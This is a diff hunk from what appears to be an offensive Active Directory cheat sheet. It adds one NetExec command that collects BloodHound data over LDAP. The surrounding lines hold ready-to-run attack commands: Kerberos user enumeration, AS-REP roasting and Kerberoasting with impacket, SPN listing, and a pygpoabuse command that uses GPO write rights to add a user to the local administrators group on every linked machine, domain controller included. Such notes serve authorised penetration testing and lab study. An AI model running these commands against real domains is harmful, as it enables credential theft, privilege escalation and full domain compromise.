@@ -308,6 +308,7 @@ kerbrute userenum -d <domain> --dc $IP users.txt
 impacket-GetNPUsers <domain>/ -no-pass -usersfile users.txt -dc-ip $IP        # AS-REP roast
 impacket-GetUserSPNs <domain>/<user>:<pass> -dc-ip $IP -request               # Kerberoast
 setspn.exe -Q */*                              # native SPN list, from the box, no creds to type
+nxc ldap $IP -u <user> -p <pass> --bloodhound --collection All --dns-server $IP   # zip lands in ~/.nxc/logs/
 rusthound-ce -d <dom> -u <user> -p <pass> -i $IP -c All -z   # BloodHound CE collector; beats bloodhound-python
 # GenericWrite/GenericAll on a GPO = SYSTEM on every machine it links (incl. the DC):
 python3 pygpoabuse.py <dom>/<user>:<pass> -gpo-id <GUID> -command 'net localgroup administrators <user> /add' -f
